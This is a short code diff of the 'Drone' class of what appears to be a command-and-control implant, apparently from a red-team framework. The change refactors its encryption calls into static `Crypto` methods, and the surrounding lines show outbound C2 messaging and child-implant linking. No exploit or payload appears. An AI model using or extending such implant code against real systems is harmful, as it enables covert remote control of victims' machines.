@@ -22,7 +22,6 @@ namespace Drone
         private DroneConfig _config;
         private HookEngine _hookEngine;
         private Handler _handler;
-        private Crypto _crypto;
         private bool _running;
 
         private readonly List<DroneModule> _modules = new();
@@ -36,7 +35,6 @@ namespace Drone
             _config = Utilities.GenerateDefaultConfig();
             _metadata = Utilities.GenerateMetadata();
             _hookEngine = new HookEngine();
-            _crypto = new Crypto();
 
             _handler = GetHandler;
             _handler.Init(_config, _metadata);
@@ -85,7 +83,7 @@ namespace Drone
             }
             
             // otherwise handle it
-            var message = _crypto.DecryptEnvelope(envelope);
+            var message = Crypto.DecryptEnvelope(envelope);
 
             switch (message.Type)
             {
@@ -245,7 +243,7 @@ namespace Drone
 
         private void SendC2Message(C2Message message)
         {
-            var envelope = _crypto.EncryptMessage(message);
+            var envelope = Crypto.EncryptMessage(message);
             envelope.Drone = _metadata.Guid;
             
             _handler.QueueOutbound(envelope);
@@ -261,7 +259,7 @@ namespace Drone
         public void AddChildDrone(Handler handler)
         {
             var message = new C2Message(C2Message.MessageDirection.Downstream, C2Message.MessageType.NewLink, _metadata);
-            var envelope = _crypto.EncryptMessage(message);
+            var envelope = Crypto.EncryptMessage(message);
             
             handler.QueueOutbound(envelope);
             var t = handler.Start();
